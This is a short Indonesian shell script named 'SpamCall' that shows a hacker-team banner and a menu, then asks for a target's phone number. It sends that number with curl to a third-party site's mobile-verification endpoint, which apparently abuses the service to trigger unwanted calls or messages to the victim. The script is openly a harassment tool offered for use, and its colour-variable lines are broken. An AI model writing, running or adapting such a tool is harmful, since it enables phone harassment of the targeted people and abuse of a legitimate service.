#!/bin/sh

#warna kode
blue='\033[34;1m' | lolcat
green='\033[32;1m' | lolcat
purple='\033[35;1m' | lolcat
cyan='\033[36;1m' | lolcat
red='\033[31;1m' | lolcat
white='\033[37;1m' | lolcat
yellow='\033[33;1m' | lolcat

#tampilan
clear
xdg-open https://youtube.com/channel/UCQvrFl5XxyVwz2bj6_Qg7yg
sleep 2
echo
figlet SpamCall | lolcat
echo $yellow | lolcat
sleep 2
echo $yellow"===============================================" | lolcat
echo $cyan"(+) Author : MR MRFCO BLACK                (+)" | lolcat
echo $cyan"(+) Team   : HACKING                       (+)" | lolcat
echo $yellow"===============================================" | lolcat
echo $yellow | lolcat
echo $red"1). SPAM CALL" | lolcat
echo $red"2). KELUAR" | lolcat
echo $green"===============================================" | lolcat
read -p "=> " dont

if [ $dont = 1 ]
then
read -p "masukan no target =>" nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
fi
